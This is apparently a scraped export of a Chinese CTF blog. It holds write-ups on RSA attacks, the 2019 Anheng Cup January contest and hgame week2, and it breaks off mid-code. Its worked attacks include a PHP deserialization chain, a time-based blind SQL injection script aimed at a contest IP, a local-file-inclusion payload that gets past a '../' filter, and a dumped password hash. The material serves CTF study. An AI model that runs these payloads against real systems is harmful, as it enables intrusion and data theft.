然后解密1234567891011121314import libnumfrom Crypto.Util.number import long_to_bytesp=275127860351348928173285174381581152299q=319576316814478949870590164193048041239n = 87924348264132406875276140514499937145050893665602592992418171647042491658461e = 65537d = libnum.invmod(e,(p-1)*(q-1))with open('flag.enc','r') as f: c = f.read().encode('hex') c = int(c,16)m = pow(c,d,n)print long_to_bytes(m) p和q选取不当使n可分解攻击条件如果p和q选择不当，使得n可以快速分解|p-q|较大如果p-q很大，那么会有一个数很小，因此可以直接穷举法求出p和q，但是这只是理想|p-q|较小先看一条等式因为|p-q|较小，所以(p-q)²/4也会比较小，因此(p+q)²/4和n相差不大，所以(p+q)/2与√n相近，因此可以这样分解：遍历从1开始一直到√n的整数，直到找到一个整数x满足x² - n是平方数，记做y²，就有x² - n = y²，然后就能根据平方差公式分解出np-1光滑当p是n的因数，而且p-1是光滑的，可以使用Pollard’s p-1算法分解np+1光滑当p时n的因数，而且p+1是光滑的，可以使用William’s p+1算法分解n SECCON2017 very smooth拿到一个pcap文件，分离一下1binwalk -e s.pcap 然后就会有三个证书文件，15A5.crt 8F4.crt FC6.crt提一下信息123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128openssl x509 -inform der -in FC6.crt -pubkey -text -modulus -noout-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDVRqqCXPYd6Xdl9GT7/kiJrYvy8lohddAsi28qwMXCe2cDWuwZKzdB3R9NEnUxsHqwEuuGJBwJwIFJnmnvWurHjcYjDUddp+4X8C9jtvCaLTgd+baSjo2eB0f+uiSL/9/4nN+vR3FliRm2mByeFCjppTQlyioxCqbXYIMxGO4NcQIDAQAB-----END PUBLIC KEY-----Certificate: Data: Version: 1 (0x0) Serial Number: a1:8b:63:0c:7b:30:99:df Signature Algorithm: sha256WithRSAEncryption Issuer: C = JP, ST = Kawasaki, O = SRL Validity Not Before: Oct 8 02:47:17 2017 GMT Not After : Oct 8 02:47:17 2018 GMT Subject: C = JP, ST = Kawasaki, O = SRL Subject Public Key Info: Public Key Algorithm: rsaEncryption Public-Key: (1024 bit) Modulus: 00:d5:46:aa:82:5c:f6:1d:e9:77:65:f4:64:fb:fe: 48:89:ad:8b:f2:f2:5a:21:75:d0:2c:8b:6f:2a:c0: c5:c2:7b:67:03:5a:ec:19:2b:37:41:dd:1f:4d:12: 75:31:b0:7a:b0:12:eb:86:24:1c:09:c0:81:49:9e: 69:ef:5a:ea:c7:8d:c6:23:0d:47:5d:a7:ee:17:f0: 2f:63:b6:f0:9a:2d:38:1d:f9:b6:92:8e:8d:9e:07: 47:fe:ba:24:8b:ff:df:f8:9c:df:af:47:71:65:89: 19:b6:98:1c:9e:14:28:e9:a5:34:25:ca:2a:31:0a: a6:d7:60:83:31:18:ee:0d:71 Exponent: 65537 (0x10001) Signature Algorithm: sha256WithRSAEncryption 78:92:11:fb:6c:e1:7a:f7:2a:33:b8:8b:08:a7:f7:5b:de:cf: 62:0b:a0:ed:be:d0:69:88:38:93:94:9d:05:41:73:bd:7e:b3: 32:ec:8e:10:bc:3a:62:b0:56:c7:c1:3f:60:66:a7:be:b9:46: f7:46:22:6a:f3:5a:25:d5:66:94:57:0e:fc:b5:16:33:05:1c: 6f:f5:85:74:57:a4:a0:c6:ce:4f:fd:64:53:94:a9:83:b8:96: bf:5b:a7:ee:8b:1e:48:a7:d2:43:06:0e:4f:5a:86:62:69:05: e2:c0:bd:4e:89:c9:af:04:4a:77:a2:34:86:6a:b8:d2:3b:32: b7:39Modulus=D546AA825CF61DE97765F464FBFE4889AD8BF2F25A2175D02C8B6F2AC0C5C27B67035AEC192B3741DD1F4D127531B07AB012EB86241C09C081499E69EF5AEAC78DC6230D475DA7EE17F02F63B6F09A2D381DF9B6928E8D9E0747FEBA248BFFDFF89CDFAF4771658919B6981C9E1428E9A53425CA2A310AA6D760833118EE0D71openssl x509 -inform der -in 15A5.crt -pubkey -text -modulus -noout-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDVRqqCXPYd6Xdl9GT7/kiJrYvy8lohddAsi28qwMXCe2cDWuwZKzdB3R9NEnUxsHqwEuuGJBwJwIFJnmnvWurHjcYjDUddp+4X8C9jtvCaLTgd+baSjo2eB0f+uiSL/9/4nN+vR3FliRm2mByeFCjppTQlyioxCqbXYIMxGO4NcQIDAQAB-----END PUBLIC KEY-----Certificate: Data: Version: 1 (0x0) Serial Number: a1:8b:63:0c:7b:30:99:df Signature Algorithm: sha256WithRSAEncryption Issuer: C = JP, ST = Kawasaki, O = SRL Validity Not Before: Oct 8 02:47:17 2017 GMT Not After : Oct 8 02:47:17 2018 GMT Subject: C = JP, ST = Kawasaki, O = SRL Subject Public Key Info: Public Key Algorithm: rsaEncryption Public-Key: (1024 bit) Modulus: 00:d5:46:aa:82:5c:f6:1d:e9:77:65:f4:64:fb:fe: 48:89:ad:8b:f2:f2:5a:21:75:d0:2c:8b:6f:2a:c0: c5:c2:7b:67:03:5a:ec:19:2b:37:41:dd:1f:4d:12: 75:31:b0:7a:b0:12:eb:86:24:1c:09:c0:81:49:9e: 69:ef:5a:ea:c7:8d:c6:23:0d:47:5d:a7:ee:17:f0: 2f:63:b6:f0:9a:2d:38:1d:f9:b6:92:8e:8d:9e:07: 47:fe:ba:24:8b:ff:df:f8:9c:df:af:47:71:65:89: 19:b6:98:1c:9e:14:28:e9:a5:34:25:ca:2a:31:0a: a6:d7:60:83:31:18:ee:0d:71 Exponent: 65537 (0x10001) Signature Algorithm: sha256WithRSAEncryption 78:92:11:fb:6c:e1:7a:f7:2a:33:b8:8b:08:a7:f7:5b:de:cf: 62:0b:a0:ed:be:d0:69:88:38:93:94:9d:05:41:73:bd:7e:b3: 32:ec:8e:10:bc:3a:62:b0:56:c7:c1:3f:60:66:a7:be:b9:46: f7:46:22:6a:f3:5a:25:d5:66:94:57:0e:fc:b5:16:33:05:1c: 6f:f5:85:74:57:a4:a0:c6:ce:4f:fd:64:53:94:a9:83:b8:96: bf:5b:a7:ee:8b:1e:48:a7:d2:43:06:0e:4f:5a:86:62:69:05: e2:c0:bd:4e:89:c9:af:04:4a:77:a2:34:86:6a:b8:d2:3b:32: b7:39Modulus=D546AA825CF61DE97765F464FBFE4889AD8BF2F25A2175D02C8B6F2AC0C5C27B67035AEC192B3741DD1F4D127531B07AB012EB86241C09C081499E69EF5AEAC78DC6230D475DA7EE17F02F63B6F09A2D381DF9B6928E8D9E0747FEBA248BFFDFF89CDFAF4771658919B6981C9E1428E9A53425CA2A310AA6D760833118EE0D71openssl x509 -inform der -in 8F4.crt -pubkey -text -modulus -noout-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDVRqqCXPYd6Xdl9GT7/kiJrYvy8lohddAsi28qwMXCe2cDWuwZKzdB3R9NEnUxsHqwEuuGJBwJwIFJnmnvWurHjcYjDUddp+4X8C9jtvCaLTgd+baSjo2eB0f+uiSL/9/4nN+vR3FliRm2mByeFCjppTQlyioxCqbXYIMxGO4NcQIDAQAB-----END PUBLIC KEY-----Certificate: Data: Version: 1 (0x0) Serial Number: a1:8b:63:0c:7b:30:99:df Signature Algorithm: sha256WithRSAEncryption Issuer: C = JP, ST = Kawasaki, O = SRL Validity Not Before: Oct 8 02:47:17 2017 GMT Not After : Oct 8 02:47:17 2018 GMT Subject: C = JP, ST = Kawasaki, O = SRL Subject Public Key Info: Public Key Algorithm: rsaEncryption Public-Key: (1024 bit) Modulus: 00:d5:46:aa:82:5c:f6:1d:e9:77:65:f4:64:fb:fe: 48:89:ad:8b:f2:f2:5a:21:75:d0:2c:8b:6f:2a:c0: c5:c2:7b:67:03:5a:ec:19:2b:37:41:dd:1f:4d:12: 75:31:b0:7a:b0:12:eb:86:24:1c:09:c0:81:49:9e: 69:ef:5a:ea:c7:8d:c6:23:0d:47:5d:a7:ee:17:f0: 2f:63:b6:f0:9a:2d:38:1d:f9:b6:92:8e:8d:9e:07: 47:fe:ba:24:8b:ff:df:f8:9c:df:af:47:71:65:89: 19:b6:98:1c:9e:14:28:e9:a5:34:25:ca:2a:31:0a: a6:d7:60:83:31:18:ee:0d:71 Exponent: 65537 (0x10001) Signature Algorithm: sha256WithRSAEncryption 78:92:11:fb:6c:e1:7a:f7:2a:33:b8:8b:08:a7:f7:5b:de:cf: 62:0b:a0:ed:be:d0:69:88:38:93:94:9d:05:41:73:bd:7e:b3: 32:ec:8e:10:bc:3a:62:b0:56:c7:c1:3f:60:66:a7:be:b9:46: f7:46:22:6a:f3:5a:25:d5:66:94:57:0e:fc:b5:16:33:05:1c: 6f:f5:85:74:57:a4:a0:c6:ce:4f:fd:64:53:94:a9:83:b8:96: bf:5b:a7:ee:8b:1e:48:a7:d2:43:06:0e:4f:5a:86:62:69:05: e2:c0:bd:4e:89:c9:af:04:4a:77:a2:34:86:6a:b8:d2:3b:32: b7:39Modulus=D546AA825CF61DE97765F464FBFE4889AD8BF2F25A2175D02C8B6F2AC0C5C27B67035AEC192B3741DD1F4D127531B07AB012EB86241C09C081499E69EF5AEAC78DC6230D475DA7EE17F02F63B6F09A2D381DF9B6928E8D9E0747FEBA248BFFDFF89CDFAF4771658919B6981C9E1428E9A53425CA2A310AA6D760833118EE0D71 待续…… 模不互素攻击条件存在两个或以上模数，且gcd(n1,n2)!=1 攻击原理如果两个n不互素的话，可以直接对这两个数求最大公因数，然后获得p和q，进而求得私钥 SCTF RSA2公钥指数相关攻击小公钥指数攻击攻击条件e十分小 例子假设用户使用的密钥为3，加密过程是1c ≡ m³ mod n 那么就有12m³ = c + k*nm = ³√¯(c+k*n)¯ 大黑阔可以从小到大枚举k，直到开出整数 jarvisoj Extremely hard RSA题目给了pubkey.pem和flag.enc，然后openssl读下pubkey信息有123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354Public-Key: (4096 bit)Modulus: 00:b0:be:e5:e3:e9:e5:a7:e8:d0:0b:49:33:55:c6: 18:fc:8c:7d:7d:03:b8:2e:40:99:51:c1:82:f3:98: de:e3:10:45:80:e7:ba:70:d3:83:ae:53:11:47:56: 56:e8:a9:64:d3:80:cb:15:7f:48:c9:51:ad:fa:65: db:0b:12:2c:a4:0e:42:fa:70:91:89:b7:19:a4:f0: d7:46:e2:f6:06:9b:af:11:ce:bd:65:0f:14:b9:3c: 97:73:52:fd:13:b1:ee:a6:d6:e1:da:77:55:02:ab: ff:89:d3:a8:b3:61:5f:d0:db:49:b8:8a:97:6b:c2: 05:68:48:92:84:e1:81:f6:f1:1e:27:08:91:c8:ef: 80:01:7b:ad:23:8e:36:30:39:a4:58:47:0f:17:49: 10:1b:c2:99:49:d3:a4:f4:03:8d:46:39:38:85:15: 79:c7:52:5a:69:98:4f:15:b5:66:7f:34:20:9b:70: eb:26:11:36:94:7f:a1:23:e5:49:df:ff:00:60:18: 83:af:d9:36:fe:41:1e:00:6e:4e:93:d1:a0:0b:0f: ea:54:1b:bf:c8:c5:18:6c:b6:22:05:03:a9:4b:24: 13:11:0d:64:0c:77:ea:54:ba:32:20:fc:8f:4c:c6: ce:77:15:1e:29:b3:e0:65:78:c4:78:bd:1b:eb:e0: 45:89:ef:9a:19:7f:6f:80:6d:b8:b3:ec:d8:26:ca: d2:4f:53:24:cc:de:c6:e8:fe:ad:2c:21:50:06:86: 02:c8:dc:dc:59:40:2c:ca:c9:42:4b:79:00:48:cc: dd:93:27:06:80:95:ef:a0:10:b7:f1:96:c7:4b:a8: c3:7b:12:8f:9e:14:11:75:16:33:f7:8b:7b:9e:56: f7:1f:77:a1:b4:da:ad:3f:c5:4b:5e:7e:f9:35:d9: a7:2f:b1:76:75:97:65:52:2b:4b:bc:02:e3:14:d5: c0:6b:64:d5:05:4b:7b:09:6c:60:12:36:e6:cc:f4: 5b:5e:61:1c:80:5d:33:5d:ba:b0:c3:5d:22:6c:c2: 08:d8:ce:47:36:ba:39:a0:35:44:26:fa:e0:06:c7: fe:52:d5:26:7d:cf:b9:c3:88:4f:51:fd:df:df:4a: 97:94:bc:fe:0e:15:57:11:37:49:e6:c8:ef:42:1d: ba:26:3a:ff:68:73:9c:e0:0e:d8:0f:d0:02:2e:f9: 2d:34:88:f7:6d:eb:62:bd:ef:7b:ea:60:26:f2:2a: 1d:25:aa:2a:92:d1:24:41:4a:80:21:fe:0c:17:4b: 98:03:e6:bb:5f:ad:75:e1:86:a9:46:a1:72:80:77: 0f:12:43:f4:38:74:46:cc:ce:b2:22:2a:96:5c:c3: 0b:39:29Exponent: 3 (0x3)Modulus=B0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929writing RSA key-----BEGIN PUBLIC KEY-----MIICIDANBgkqhkiG9w0BAQEFAAOCAg0AMIICCAKCAgEAsL7l4+nlp+jQC0kzVcYY/Ix9fQO4LkCZUcGC85je4xBFgOe6cNODrlMRR1ZW6Klk04DLFX9IyVGt+mXbCxIspA5C+nCRibcZpPDXRuL2BpuvEc69ZQ8UuTyXc1L9E7Huptbh2ndVAqv/idOos2Ff0NtJuIqXa8IFaEiShOGB9vEeJwiRyO+AAXutI442MDmkWEcPF0kQG8KZSdOk9AONRjk4hRV5x1JaaZhPFbVmfzQgm3DrJhE2lH+hI+VJ3/8AYBiDr9k2/kEeAG5Ok9GgCw/qVBu/yMUYbLYiBQOpSyQTEQ1kDHfqVLoyIPyPTMbOdxUeKbPgZXjEeL0b6+BFie+aGX9vgG24s+zYJsrST1MkzN7G6P6tLCFQBoYCyNzcWUAsyslCS3kASMzdkycGgJXvoBC38ZbHS6jDexKPnhQRdRYz94t7nlb3H3ehtNqtP8VLXn75NdmnL7F2dZdlUitLvALjFNXAa2TVBUt7CWxgEjbmzPRbXmEcgF0zXbqww10ibMII2M5HNro5oDVEJvrgBsf+UtUmfc+5w4hPUf3f30qXlLz+DhVXETdJ5sjvQh26Jjr/aHOc4A7YD9ACLvktNIj3betive976mAm8iodJaoqktEkQUqAIf4MF0uYA+a7X6114YapRqFygHcPEkP0OHRGzM6yIiqWXMMLOSkCAQM=-----END PUBLIC KEY----- e很小，所以我们可以直接进行指数攻击12345678910111213import gmpy2,libnumn=0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929e=3res=0c=int(open('flag.enc','rb').read().encode('hex'),16)for k in range(118700000, 118750000): a, b = gmpy2.iroot(c+n*k,e) if b==1: res=a print k print res print libnum.n2s(res) break 他的k是118719488，减小范围，跑的快一点，最后拿到flag1Didn't you know RSA padding is really important? Now you see a non-padding message is so dangerous. And you should notice this in future.Fl4g: PCTF&#123;Sm4ll_3xpon3nt_i5_W3ak&#125; rabin算法攻击条件e = 2 攻击原理密文1c = m² mod n 解密过程12345678910算mp和mqmp = √c mod pmq = √c mod q由扩展欧几里得算出yp*p + yq*q = 1得到四个明文a = (yp*p*mq + yq*q*mp) mod nb = n - ac = (yp*p*mq - yq*q*mp) mod nd = n - c 如果 p ≡ q ≡ 3 (mod 4)，那么 jarvisoj hardRSAopenssl提信息123456789101112Public-Key: (256 bit)Modulus: 00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:ddExponent: 2 (0x2)Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDwriting RSA key-----BEGIN PUBLIC KEY-----MDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDryigb/+l/vjDdAgEC-----END PUBLIC KEY----- 分解n得到12p = 275127860351348928173285174381581152299q = 319576316814478949870590164193048041239 利用rabin算法去写脚本1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/python# coding:utf-8import gmpy2import stringfrom Crypto.PublicKey import RSAwith open('pubkey.pem','r') as f: key = RSA.importKey(f) n = key.n e = key.ewith open('flag.enc','r') as f: c = f.read().encode('hex') c = string.atoi(c,base=16)print \"start\"p = 275127860351348928173285174381581152299q = 319576316814478949870590164193048041239#计算yp和yqinv_p = gmpy2.invert(p,q)inv_q = gmpy2.invert(q,p)#计算mp和mqmp = pow(c,(p+1)/4,p)mq = pow(c,(q+1)/4,q)#算a b c da = (inv_p * p * mq + inv_q * q * mp) % nb = n - int(n)c = (inv_p * p * mq - inv_q * q * mp) % nd = n - int(c)for i in (a,b,c,d): s = '%x' % i if len(s) % 2 != 0: s = '0'+s print s.decode('hex') 最后拿到flag：PCTF{sp3ci4l_rsa}","comments":true,"permalink":"https://xi4or0uji.github.io/2019/02/12/RSA初探/","categories":[{"name":"CRYPTO","slug":"CRYPTO","permalink":"https://xi4or0uji.github.io/categories/CRYPTO/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"https://xi4or0uji.github.io/tags/RSA/"}]},{"title":"2019安恒杯一月赛","date":"2019-02-06T16:00:00.000Z","path":"2019/02/07/安恒杯一月赛/","text":"webbabygo源码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?php@error_reporting(1);include 'flag.php';class baby&#123; protected $skyobj; public $aaa; public $bbb; function __construct() &#123; $this-&gt;skyobj = new sec; &#125; function __toString() &#123; if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); &#125;&#125;class cool&#123; public $filename; public $nice; public $amzing; function read() &#123; $this-&gt;nice = unserialize($this-&gt;amzing); $this-&gt;nice-&gt;aaa = $sth; if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb) &#123; $file = \"./&#123;$this-&gt;filename&#125;\"; if (file_get_contents($file)) &#123; return file_get_contents($file); &#125; else &#123; return \"you must be joking!\"; &#125; &#125; &#125;&#125;class sec&#123; function read() &#123; return \"it's so sec~~\"; &#125;&#125;if (isset($_GET['data']))&#123; $Input_data = unserialize($_GET['data']); echo $Input_data;&#125;else&#123; highlight_file(\"./index.php\");&#125;?&gt; 可以看到有个flag.php文件，也有个file_get_contents函数，想要读文件要先满足1$this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb 但是这句代码前几行可以看见aaa的值会改变，且被改的值不知道，所以不能直接在类里面赋值使aaa和bbb相等，用&amp;去让他们指向相同再往上看可以看见unserialize函数，这题基本可以确定是反序列化的利用了，先构造aaa和bbb指向相同123456789101112131415161718192021222324class baby&#123; protected $skyobj; public $aaa; public $bbb; function __construct() &#123; $this-&gt;skyobj = new cool; &#125; function __toString() &#123; if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); &#125;&#125;class cool&#123; public $filename; public $nice; public $amzing;&#125;$a = new baby();$a-&gt;bbb =&amp;$a-&gt;aaa;echo urlencode(serialize($a)); 得出1O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D 然后就是反序列化的利用，exp如下1234567891011121314151617181920212223class baby&#123; protected $skyobj; public $aaa; public $bbb; function __construct() &#123; $this-&gt;skyobj = new cool; &#125; function __toString() &#123; if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); &#125;&#125;class cool&#123; public $filename = './flag.php'; public $nice; public $amzing = 'O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D';&#125;$a = new baby();echo urlencode(serialize($a)); 得到1O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A10%3A%22.%2Fflag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3Bs%3A227%3A%22O%253A4%253A%2522baby%2522%253A3%253A%257Bs%253A9%253A%2522%2500%252A%2500skyobj%2522%253BO%253A4%253A%2522cool%2522%253A3%253A%257Bs%253A8%253A%2522filename%2522%253BN%253Bs%253A4%253A%2522nice%2522%253BN%253Bs%253A6%253A%2522amzing%2522%253BN%253B%257Ds%253A3%253A%2522aaa%2522%253BN%253Bs%253A3%253A%2522bbb%2522%253BR%253A6%253B%257D%22%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BN%3B%7D 最后data发送过去就行 simple php这题进去就看到一个页面，扫一下后台能看到有robots.txt，打开看下有访问/admin可以看到有个登录的地方，试了一下，发现可以水平越权，最后可以1admin 1和任意密码 登进去登进去以后发现是tp3.2框架，猜测是框架注入漏洞，尝试一下1http://101.71.29.5:10010/Admin/User/Index?search[table]=flag where 1 and polygon(id)-- 可以看到数据库是tpctf，表是flag，尝试一下有没有flag这个字段1http://101.71.29.5:10010/Admin/User/Index?search[table]=flag where 1 and polygon(flag)-- 接下来看到没有unknown column，所以flag是在tpctf数据库，flag表的flag字段里面剩下的就是利用了1http://101.71.29.5:10010/Admin/User/Index?search[table]=flag where 1 and if(1,sleep(5),0)-- 然后又确实可以延时，至此，exp出来了1234567891011121314import requestsflag = ''cookies = &#123; 'PHPSESSID': 're4g49sil8hfh4ovfrk7ln1o02'&#125;for i in range(1,33): for j in '0123456789abcdef': url = 'http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if((ascii(substr((select flag from flag limit 0,1),'+str(i)+',1))='+str(ord(j))+'),sleep(5),0)--' try: r = requests.get(url=url,timeout=3,cookies=cookies) except: flag += j print(flag) break 然后就能拿到flag了 misc赢战2019这题首先拿到一个图片，放去binwalk一下发现还有另一张图片，分离出来扫一下只有眉头一皱，发现这个二维码并没有那么简单，接下来去stegsolve，点几下就有了……. memory这题是内存取证，直接用volatility做就行12volatility imageinfo -f memory #分析操作系统volatility hushdump -f memory --profile=WinXPSP2x86 #查看当前操作系统用户的password hush 这样就能知道管理员的密码了1Administrator:500:0182bd0bd4444bf867cd839bf040d93b:c22b315c040ae6e0efee3518d830362b::: 将密码拿去解密一下然后再加密就是flag了 crypto键盘之争这题给了这个字符串：ypau_kjg;”g;”ypau+，然后题目是键盘之争，谷歌做题23333谷歌第一个就有了，发现是两个键盘的对应对应出来是flag{this_is_flag}，然后md5就行了 get it题目123456789101112131415161718Alice和Bob正在进行通信，作为中间人的Eve一直在窃听他们两人的通信。Eve窃听到这样一段内容，主要内容如下：p = 37A = 17B = 31U2FsdGVkX1+mrbv3nUfzAjMY1kzM5P7ok/TzFCTFGs7ivutKLBLGbZxOfFebNdb2l7V38e7I2ywU+BW/2dOTWIWnubAzhMN+jzlqbX6dD1rmGEd21sEAp40IQXmN/Y0OK4nCu4xEuJsNsTJZhk50NaPTDk7J7J+wBsScdV0fIfe23pRg58qzdVljCOzosb627oPwxidBEPuxs4WYehm+15zjw2cw03qeOyaXnH/yeqytKUxKqe2L5fytlr6FybZwHkYlPZ7JarNOIhO2OP3n53OZ1zFhwzTvjf7MVPsTAnZYc+OF2tqJS5mgWkWXnPal+A2lWQgmVxCsjl1DLkQiWy+bFY3W/X59QZ1GEQFY1xqUFA4xCPkUgB+G6AC8DTpKix5+Grt91ie09Ye/SgBliKdt5BdPZplp0oJWdS8Iy0bqfF7voKX3VgTwRaCENgXlVwhPEOslBJRh6Pk0cA0kUzyOQ+xFh82YTrNBX6xtucMhfoenc2XDCLp+qGVW9Kj6m5lSYiFFd0E=分析得知，他们是在公共信道上交换加密密钥，共同建立共享密钥。而上面这段密文是Alice和Bob使用自己的密值和共享秘钥，组成一串字符的md5值的前16位字符作为密码使用另外一种加密算法加密明文得到的。例如Alice的密值为3，Bob的密值为6，共享秘钥为35，那么密码为：password = hashlib.md5(\"(3,6,35)\").hexdigest()[0:16] 这题的过程跟Diffie-Hellman密钥交换算法很相似所以A的公钥为17，B的公钥为31，素数p为37，现在要求gg是模p本原单位根，所谓本原单位根就是指在模p乘法运算下，g的1次方，2次方……(p-1)次方这p-1个数互不相同，并且取遍1到p-1。调用sagemath函数求出来12$ print primitive_root(37)$ 2 又因为12A = g^a mod pB = g^b mod p 剩下求a和b可以用在线网站求可以得出来a是7，b是9，又key = g^(b*a) mod p12345a = 7b = 9g = 2p = 37print pow(g,a*b,p) 求出来key是6结合样例的去求password123import hashlibpassword = hashlib.md5(\"(7,9,6)\").hexdigest()[0:16]print password 得出来a7ece9d133c9ec03再结合密文解密，因为是U2F开头，尝试下RC4，AES，DES等解密DES解密出来flag是8598544ba1a5713b1de04d3f0c41eb71参考一叶飘零的wp","comments":true,"permalink":"https://xi4or0uji.github.io/2019/02/07/安恒杯一月赛/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"安恒杯","slug":"安恒杯","permalink":"https://xi4or0uji.github.io/tags/安恒杯/"}]},{"title":"2019 hgame week2","date":"2019-02-02T16:00:00.000Z","path":"2019/02/03/2019-hgame-week2/","text":"easy_php这题进去首先可以看到一个index.html，题目是where is my robots，访问一下robots.txt，提示img/index.php，访问一下这个php文件，就到了代码审计了12345678&lt;?php error_reporting(0); $img = $_GET['img']; if(!isset($img)) $img = '1'; $img = str_replace('../', '', $img); include_once($img.\".php\"); highlight_file(__FILE__); 可以看到一个include_once，很明显的文件包含漏洞，同时扫下后台可以知道easyphp目录下有个flag.php，但是也可以看到flag.php是在img/index.php的上一层目录，又因为过滤了一次../双写绕过就行，最终payload1http://118.24.25.25:9999/easyphp/img/index.php?img=php://filter/read=convert.base64-encode/resource=....//flag php trick源码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 &lt;?php//admin.phphighlight_file(__FILE__);$str1 = (string)@$_GET['str1'];$str2 = (string)@$_GET['str2'];$str3 = @$_GET['str3'];$str4 = @$_GET['str4'];$str5 = @$_GET['H_game'];$url = @$_GET['url'];if( $str1 == $str2 )&#123; die('step 1 fail');&#125;if( md5($str1) != md5($str2) )&#123; die('step 2 fail');&#125;if( $str3 == $str4 )&#123; die('step 3 fail');&#125;if ( md5($str3) !== md5($str4))&#123; die('step 4 fail');&#125;if (strpos($_SERVER['QUERY_STRING'], \"H_game\") !==false) &#123; die('step 5 fail');&#125;if(is_numeric($str5))&#123; die('step 6 fail');&#125;if ($str5&lt;9999999999)&#123; die('step 7 fail');&#125;if ((string)$str5&gt;0)&#123; die('step 8 fial');&#125;if (parse_url($url, PHP_URL_HOST) !== \"www.baidu.com\")&#123; die('step 9 fail');&#125;if (parse_url($url,PHP_URL_SCHEME) !== \"http\")&#123; die('step 10 fail');&#125;$ch = curl_init();curl_setopt($ch,CURLOPT_URL,$url);$output = curl_exec($ch);curl_close($ch);if($output === FALSE)&#123; die('step 11 